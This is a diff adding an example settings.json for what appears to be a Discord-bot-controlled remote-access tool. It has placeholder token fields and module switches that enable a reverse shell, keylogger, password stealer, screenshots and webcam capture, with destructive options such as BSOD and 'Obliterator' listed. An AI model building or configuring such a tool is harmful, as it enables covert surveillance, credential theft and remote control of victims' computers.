@@ -1,0 +1,23 @@
+{
+  "BotData": {
+    "Token": "this is an example for the settings.json file",
+    "GuildID": "this is an example for the settings.json file"
+  },
+  "Modules": {
+    "ReverseShell": true,
+    "FileBrowser": false,
+    "Downloader": false,
+    "BSOD": false,
+    "Clipboard": false,
+    "AudioControlls": true,
+    "GhostWriter": false,
+    "KeyboardShortcuts": false,
+    "Keylogger": true,
+    "Obliterator": false,
+    "PasswordStealer": true,
+    "Screenshot": true,
+    "Webcam": true,
+    "WallpaperChanger": false,
+    "TTS": false
+  }
+}
